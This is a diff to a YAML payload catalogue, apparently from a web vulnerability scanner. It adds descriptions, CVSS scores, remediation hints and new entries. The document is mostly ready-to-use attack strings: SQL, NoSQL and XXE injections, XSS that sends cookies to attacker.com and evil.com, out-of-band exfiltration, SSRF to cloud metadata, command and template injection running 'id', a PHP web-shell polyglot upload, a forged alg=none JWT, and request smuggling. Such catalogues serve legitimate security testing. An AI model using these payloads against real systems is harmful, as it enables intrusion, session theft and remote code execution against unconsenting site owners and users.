@@ -2,35 +2,102 @@
 
 # SQL Injection Payloads
 sql:
-  - name: "SQLi - Union Based"
-    payload: "' UNION SELECT table_name,column_name,1 FROM information_schema.columns-- -"
-    method: "GET"
-    parameters: {id: "1"}
-    severity: "critical"
-    tags: ["sqli", "union", "database"]
+  union_based:
+    - name: "SQLi - Union Based"
+      payload: "' UNION SELECT table_name,column_name,1 FROM information_schema.columns-- -"
+      description: "This payload extracts table and column names from the database using UNION SELECT."
+      method: "GET"
+      parameters: {id: "1"}
+      cvss: "9.8"
+      severity: "critical"
+      tags: ["sqli", "union", "database"]
 
-  - name: "SQLi - Time Based"
-    payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
-    method: "GET"
-    parameters: {id: "1"}
-    severity: "critical"
-    tags: ["sqli", "time-based", "blind"]
+  time_based:
+    - name: "SQLi - Time Based"
+      payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
+      description: "This payload tests for SQLi vulnerabilities based on time delays."
+      method: "GET"
+      parameters: {id: "1"}
+      cvss: "9.8"
+      severity: "critical"
+      tags: ["sqli", "time-based", "blind"]
+
+  error_based:
+    - name: "SQLi - Error Based"
+      payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -"
+      description: "This payload extracts database information through error messages."
+      method: "GET"
+      parameters: {id: "1"}
+      cvss: "9.8"
+      severity: "critical"
+      tags: ["sqli", "error-based", "database"]
+
+  boolean_based:
+    - name: "SQLi - Boolean Based"
+      payload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 UNION SELECT 2) END)=1-- -"
+      description: "This payload tests for SQLi vulnerabilities based on boolean responses."
+      method: "GET"
+      parameters: {id: "1"}
+      cvss: "9.8"
+      severity: "critical"
+      tags: ["sqli", "boolean-based", "blind"]
+
+  oob:
+    - name: "SQLi - Out-of-Band"
+      payload: "' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\share\\a.txt')))-- -"
+      description: "This payload exfiltrates data using out-of-band channels."
+      method: "GET"
+      parameters: {id: "1"}
+      cvss: "9.8"
+      severity: "critical"
+      tags: ["sqli", "oob", "exfiltration"]
 
 # Cross-Site Scripting (XSS) Payloads
 xss:
   - name: "XSS - Advanced DOM"
     payload: "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))/>"
+    description: "This payload executes XSS via DOM using Base64 encoding."
     method: "GET"
     parameters: {input: "test"}
+    remediation: "Sanitize inputs and avoid using `innerHTML` or `eval`."
     severity: "high"
     tags: ["xss", "dom", "encoded"]
 
   - name: "XSS - Template Literal"
     payload: "`${alert(document.cookie)}`"
+    description: "This payload executes XSS using template literals."
     method: "GET"
     parameters: {input: "test"}
+    remediation: "Sanitize inputs and avoid using `eval`."
     severity: "high"
     tags: ["xss", "template"]
+
+  - name: "XSS - Event Handlers"
+    payload: "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>"
+    description: "This payload executes XSS via event handlers."
+    method: "GET"
+    parameters: {input: "test"}
+    remediation: "Sanitize inputs and avoid using `innerHTML`."
+    severity: "high"
+    tags: ["xss", "event-handler", "exfiltration"]
+
+  - name: "XSS - Script Injection"
+    payload: "<script>Object.defineProperty(window,'x',{get:function(){fetch('https://evil.com/'+document.cookie)}})</script>"
+    description: "This payload injects scripts via object property definitions."
+    method: "GET"
+    parameters: {input: "test"}
+    remediation: "Sanitize inputs and avoid using `eval`."
+    severity: "critical"
+    tags: ["xss", "script", "property-injection"]
+
+  - name: "XSS - CSP Bypass"
+    payload: "<script src='data:,alert(1)'></script>"
+    description: "This payload bypasses Content Security Policy (CSP)."
+    method: "GET"
+    parameters: {input: "test"}
+    remediation: "Strengthen CSP and avoid allowing `data:` in policies."
+    severity: "critical"
+    tags: ["xss", "csp-bypass", "data-uri"]
 
 # XML External Entity (XXE) Payloads
 xxe:
@@ -41,15 +108,43 @@ xxe:
       <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
       %dtd;]>
       <data>&send;</data>
+    description: "This payload exfiltrates data using out-of-band channels."
     method: "POST"
     headers: {"Content-Type": "application/xml"}
     severity: "critical"
     tags: ["xxe", "oob", "exfiltration"]
 
+  - name: "XXE - Parameter Entities"
+    payload: |
+      <?xml version="1.0"?><!DOCTYPE test [
+      <!ENTITY % param1 "<!ENTITY &#x25; param2 SYSTEM 'file:///etc/passwd'>">
+      %param1;%param2;]>
+      <test></test>
+    description: "This payload extracts data using parameter entities."
+    method: "POST"
+    headers: {"Content-Type": "application/xml"}
+    severity: "critical"
+    tags: ["xxe", "parameter-entity", "local-file"]
+
+  - name: "XXE - SOAP Injection"
+    payload: |
+      <?xml version="1.0"?><!DOCTYPE soap:Envelope [
+      <!ENTITY attack SYSTEM "file:///etc/passwd">
+      ]>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>&attack;</soap:Body>
+      </soap:Envelope>
+    description: "This payload injects XXE into SOAP requests."
+    method: "POST"
+    headers: {"Content-Type": "text/xml"}
+    severity: "critical"
+    tags: ["xxe", "soap", "local-file"]
+
 # Server-Side Request Forgery (SSRF) Payloads
 ssrf:
   - name: "SSRF - Cloud Metadata"
     payload: "http://169.254.169.254/latest/dynamic/instance-identity/document"
+    description: "This payload accesses cloud metadata services."
     method: "GET"
     parameters: {url: "http://169.254.169.254/latest/dynamic/instance-identity/document"}
     severity: "critical"
@@ -57,6 +152,7 @@ ssrf:
 
   - name: "SSRF - Internal Network"
     payload: "dict://internal-api:11211/"
+    description: "This payload accesses internal network services."
     method: "GET"
     parameters: {url: "dict://internal-api:11211/"}
     severity: "critical"
@@ -66,15 +162,19 @@ ssrf:
 rce:
   - name: "RCE - Python Code Injection"
     payload: "__import__('os').system('id')"
+    description: "This payload injects system commands in Python applications."
     method: "POST"
     parameters: {code: "__import__('os').system('id')"}
+    environment: "linux"
     severity: "critical"
     tags: ["rce", "python", "code-injection"]
 
   - name: "RCE - Command Chain"
     payload: "|net user;whoami;systeminfo"
+    description: "This payload injects system commands in Windows applications."
     method: "GET"
     parameters: {cmd: "test"}
+    environment: "windows"
     severity: "critical"
     tags: ["rce", "windows", "command"]
 
@@ -82,6 +182,7 @@ rce:
 jwt:
   - name: "JWT - Algorithm Confusion"
     payload: "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."
+    description: "This payload exploits JWT algorithm confusion vulnerabilities."
     method: "GET"
     headers: {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."}
     severity: "high"
@@ -91,6 +192,7 @@ jwt:
 graphql:
   - name: "GraphQL - Introspection"
     payload: "{__schema{types{name,fields{name,args{name,description,type{name}}}}}}"
+    description: "This payload extracts GraphQL schema via introspection queries."
     method: "POST"
     headers: {"Content-Type": "application/json"}
     severity: "medium"
@@ -98,6 +200,7 @@ graphql:
 
   - name: "GraphQL - DoS"
     payload: "{user(id:1){friends{friends{friends{friends{id,name}}}}}}"
+    description: "This payload performs Denial of Service (DoS) attacks on GraphQL."
     method: "POST"
     headers: {"Content-Type": "application/json"}
     severity: "high"
@@ -107,6 +210,7 @@ graphql:
 nosql:
   - name: "NoSQL - MongoDB Injection"
     payload: "{\"$gt\":\"\"}"
+    description: "This payload injects NoSQL queries into MongoDB databases."
     method: "POST"
     parameters: {"username": "{\"$gt\":\"\"}", "password": "{\"$gt\":\"\"}"}
     severity: "high"
@@ -116,6 +220,7 @@ nosql:
 ssti:
   - name: "SSTI - RCE Through Template"
     payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    description: "This payload executes system commands via template injection."
     method: "POST"
     parameters: {template: "test"}
     severity: "critical"
@@ -125,6 +230,7 @@ ssti:
 file_upload:
   - name: "File Upload - Double Extension"
     payload: "malicious.php.jpg"
+    description: "This payload bypasses file extension checks."
     method: "POST"
     content_type: "image/jpeg"
     severity: "high"
@@ -133,6 +239,7 @@ file_upload:
   - name: "File Upload - Polyglot"
     payload: "payload.php.gif"
     content: "GIF89a<?php system($_GET['cmd']); ?>"
+    description: "This payload uploads polyglot files to execute commands."
     method: "POST"
     content_type: "image/gif"
     severity: "critical"
@@ -142,6 +249,7 @@ file_upload:
 cors:
   - name: "CORS - Wildcard Origin"
     payload: "*"
+    description: "This payload tests for insecure CORS configurations."
     method: "OPTIONS"
     headers: {"Origin": "https://evil.com"}
     severity: "high"
@@ -151,6 +259,7 @@ cors:
 host_header:
   - name: "Host Header - Password Reset Poisoning"
     payload: "evil.com"
+    description: "This payload poisons password reset requests via Host header manipulation."
     method: "POST"
     headers: {"Host": "evil.com"}
     severity: "high"
@@ -160,6 +269,7 @@ host_header:
 smuggling:
   - name: "Request Smuggling - CL.TE"
     payload: "Content-Length: 3\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n"
+    description: "This payload tests for HTTP request smuggling vulnerabilities."
     method: "POST"
     headers: {"Content-Length": "3", "Transfer-Encoding": "chunked"}
     severity: "critical"
